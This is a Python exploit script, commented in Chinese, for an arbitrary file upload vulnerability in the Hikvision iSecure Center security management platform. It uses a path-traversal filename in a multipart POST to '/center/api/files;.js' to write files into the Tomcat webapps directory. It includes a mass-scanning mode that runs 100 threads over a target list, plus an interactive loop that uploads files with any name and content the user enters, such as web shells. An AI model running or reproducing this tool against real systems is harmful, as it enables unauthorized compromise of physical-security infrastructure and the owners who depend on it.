import argparse,requests,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test="""
    <<<<<<<海康威视isecure center 综合安防管理平台存在任意文件上传>>>>>>>>
    """
    print(test)

def poc(target):
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    payload = "/center/api/files;.js"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0",
        "Cache-Control": "no-cache",
        "Content-Type": "multipart/form-data; boundary=e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f",
        "Pragma": "no-cache",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close"
    }

    data = "--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/test.txt\"\r\nContent-Type: application/octet-stream\r\n\r\nabc\r\n--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f--"
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,verify=False)
        if "link" in res1.text:
            print(f"[+]{target}存在任意文件上传")
            with open('success.txt','a',encoding='utf-8') as f:
                f.write(f"[+]{target}存在任意文件上传\n")
        elif res1.status_code != 200:
            print(f"[?]{target}网站未响应，请手工测试")
        else:
            print(f"[-]{target}该网站不存在任意文件上传")
    except Exception as e:
        print(f"[-]{e}")

def exp(target):
    print("----------------漏洞利用----------------------")
    time.sleep(2)
    while True:
        filename = input("请输入文件名:")
        content = input("请输入文件的内容")
        if filename == "q" or content == "q":
            print("正在退出..............")
            break
        payload = '/center/api/files;.js'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0",
            "Cache-Control": "no-cache",
            "Content-Type": "multipart/form-data; boundary=e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f",
            "Pragma": "no-cache",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "close"
        }
        data = "--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/" + f"{filename}" + "\"\r\nContent-Type: application/octet-stream\r\n\r\n" + f"{content}" + "\r\n--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f--"
        try:
            response = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
            result1 = target + f"/clusterMgr/{filename};.js"
            print(result1)
            if response.status_code == 200 and "filename" in response.text:
                print(f"[+]{target}存在文件上传漏洞\n[+]访问：{result1}\n")
                with open('success.txt','a',encoding='utf-8') as f:
                    f.write(f"[+]{target}存在文件上传漏洞\n[+]访问：{result1}\n")

            else:
                print(f"[-]{target}不存在漏洞")

        except Exception as e:
            print(f"[?]{target}网站异常")


def main():
    banner()
    parse = argparse.ArgumentParser()
    parse.add_argument('-u','--url',dest='url',type=str,help='please enter url')
    parse.add_argument('-f','--file',dest='file',type=str,help='please enter file')
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
        exp(args.url)
    if args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()


if __name__ == '__main__':
    main()